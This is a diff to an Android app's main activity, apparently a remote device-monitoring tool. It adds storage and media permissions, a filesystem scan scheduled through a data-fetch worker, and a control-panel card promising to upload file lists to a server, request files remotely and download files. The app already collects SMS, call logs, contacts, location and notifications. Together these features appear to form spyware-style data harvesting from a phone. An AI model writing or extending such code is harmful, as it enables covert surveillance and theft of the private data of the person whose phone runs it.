@@ -53,6 +53,7 @@ class MainActivity : ComponentActivity() {
 
     private lateinit var permissionManager: PermissionManager
     private lateinit var appPrefs: AppPreferences
+    private lateinit var fileSystemManager: FileSystemManager
     private val uiState = mutableStateOf(UiState())
 
     private val permissionsLauncher = registerForActivityResult(
@@ -75,8 +76,19 @@ class MainActivity : ComponentActivity() {
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.READ_SMS,
         Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             Manifest.permission.POST_NOTIFICATIONS
+        } else null,
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            Manifest.permission.READ_MEDIA_IMAGES
+        } else null,
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            Manifest.permission.READ_MEDIA_VIDEO
+        } else null,
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            Manifest.permission.READ_MEDIA_AUDIO
         } else null
     )
 
@@ -89,6 +101,7 @@ class MainActivity : ComponentActivity() {
         super.onCreate(savedInstanceState)
         permissionManager = PermissionManager(this, permissionsLauncher)
         appPrefs = AppPreferences(applicationContext)
+        fileSystemManager = FileSystemManager(applicationContext)
 
         // Initialize registration status on first launch
         if (!appPrefs.hasInitializedApp()) {
@@ -108,7 +121,9 @@ class MainActivity : ComponentActivity() {
                         uiState = uiState.value,
                         onDeviceNameChange = { newName -> uiState.value = uiState.value.copy(deviceName = newName) },
                         onRegisterClick = { registerDeviceManually() },
-                        onRequestBackgroundLocation = { showBackgroundLocationDialog() }
+                        onRequestBackgroundLocation = { showBackgroundLocationDialog() },
+                        hasFileSystemPermissions = fileSystemManager.hasFileSystemPermissions(),
+                        onScanFileSystem = { scanFileSystem() }
                     )
                 }
             }
@@ -201,6 +216,19 @@ class MainActivity : ComponentActivity() {
         return Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
             ?.contains(packageName) == true
     }
+
+    private fun scanFileSystem() {
+        if (!fileSystemManager.hasFileSystemPermissions()) {
+            Toast.makeText(this, "Filesystem permissions required", Toast.LENGTH_SHORT).show()
+            permissionManager.requestPermissions(requiredPermissions)
+            return
+        }
+
+        Toast.makeText(this, "Starting filesystem scan...", Toast.LENGTH_SHORT).show()
+        
+        // Schedule the filesystem scan worker
+        DataFetchWorker.scheduleWork(applicationContext, DataFetchWorker.COMMAND_SCAN_FILESYSTEM)
+    }
 }
 
 data class UiState(
@@ -220,7 +248,9 @@ fun ControlPanelScreen(
     uiState: UiState,
     onDeviceNameChange: (String) -> Unit,
     onRegisterClick: () -> Unit,
-    onRequestBackgroundLocation: () -> Unit
+    onRequestBackgroundLocation: () -> Unit,
+    hasFileSystemPermissions: Boolean = false,
+    onScanFileSystem: () -> Unit = {}
 ) {
     val context = LocalContext.current
 
@@ -254,6 +284,14 @@ fun ControlPanelScreen(
                 onRequestBackgroundLocation = onRequestBackgroundLocation,
                 hasBackgroundLocation = hasBackgroundLocation,
                 isNotificationListenerEnabled = uiState.isNotificationListenerEnabled
+            )
+            
+            Spacer(modifier = Modifier.height(24.dp))
+            
+            FileSystemSection(
+                hasFileSystemPermissions = hasFileSystemPermissions,
+                onScanFileSystem = onScanFileSystem,
+                onRequestAllPermissions = { permissionManager.requestPermissions(requiredPermissions) }
             )
         }
     }
@@ -670,6 +708,135 @@ fun getPermissionIcon(permissionName: String): ImageVector {
         permissionName.contains("CONTACTS") -> Icons.Default.Contacts
         permissionName.contains("NOTIFICATION") -> Icons.Default.Notifications
         permissionName.contains("CALL") -> Icons.Default.Call
+        permissionName.contains("STORAGE") || permissionName.contains("MEDIA") -> Icons.Default.Storage
         else -> Icons.Default.Security
+    }
+}
+
+@Composable
+fun FileSystemSection(
+    hasFileSystemPermissions: Boolean,
+    onScanFileSystem: () -> Unit,
+    onRequestAllPermissions: () -> Unit
+) {
+    Card(
+        modifier = Modifier
+            .fillMaxWidth()
+            .shadow(4.dp, RoundedCornerShape(16.dp))
+    ) {
+        Column(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(24.dp)
+        ) {
+            Row(
+                verticalAlignment = Alignment.CenterVertically,
+                modifier = Modifier.padding(bottom = 16.dp)
+            ) {
+                Icon(
+                    imageVector = Icons.Default.Storage, 
+                    contentDescription = null,
+                    tint = MaterialTheme.colorScheme.primary
+                )
+                Spacer(modifier = Modifier.width(8.dp))
+                Text(
+                    "File System Management",
+                    style = MaterialTheme.typography.titleMedium.copy(
+                        fontWeight = FontWeight.SemiBold
+                    )
+                )
+            }
+
+            Text(
+                "Scan and manage device files for remote access",
+                style = MaterialTheme.typography.bodyMedium,
+                color = MaterialTheme.colorScheme.onSurfaceVariant,
+                modifier = Modifier.padding(bottom = 16.dp)
+            )
+
+            if (!hasFileSystemPermissions) {
+                ElevatedButton(
+                    onClick = onRequestAllPermissions,
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(48.dp),
+                    shape = RoundedCornerShape(12.dp),
+                    colors = ButtonDefaults.elevatedButtonColors(
+                        containerColor = MaterialTheme.colorScheme.errorContainer,
+                        contentColor = MaterialTheme.colorScheme.onErrorContainer
+                    )
+                ) {
+                    Icon(Icons.Default.Warning, contentDescription = null)
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Text("Grant Storage Permissions")
+                }
+                
+                Spacer(modifier = Modifier.height(8.dp))
+                
+                Text(
+                    "Storage permissions are required to scan and access files",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.error
+                )
+            } else {
+                Button(
+                    onClick = onScanFileSystem,
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(56.dp),
+                    shape = RoundedCornerShape(12.dp),
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = MaterialTheme.colorScheme.primary
+                    )
+                ) {
+                    Icon(
+                        imageVector = Icons.Default.FolderOpen,
+                        contentDescription = null,
+                        modifier = Modifier.size(20.dp)
+                    )
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Text(
+                        "Scan File System",
+                        style = MaterialTheme.typography.titleSmall
+                    )
+                }
+                
+                Spacer(modifier = Modifier.height(16.dp))
+                
+                Card(
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = CardDefaults.cardColors(
+                        containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
+                    )
+                ) {
+                    Column(
+                        modifier = Modifier.padding(16.dp)
+                    ) {
+                        Text(
+                            "📋 Features:",
+                            style = MaterialTheme.typography.titleSmall.copy(
+                                fontWeight = FontWeight.Medium
+                            ),
+                            modifier = Modifier.padding(bottom = 8.dp)
+                        )
+                        
+                        val features = listOf(
+                            "📁 Scan accessible directories and files",
+                            "📤 Upload file lists to server for analysis",
+                            "🔍 Remote file requesting capability",
+                            "⬇️ Download files from server storage"
+                        )
+                        
+                        features.forEach { feature ->
+                            Text(
+                                feature,
+                                style = MaterialTheme.typography.bodySmall,
+                                modifier = Modifier.padding(vertical = 2.dp)
+                            )
+                        }
+                    }
+                }
+            }
+        }
     }
 }
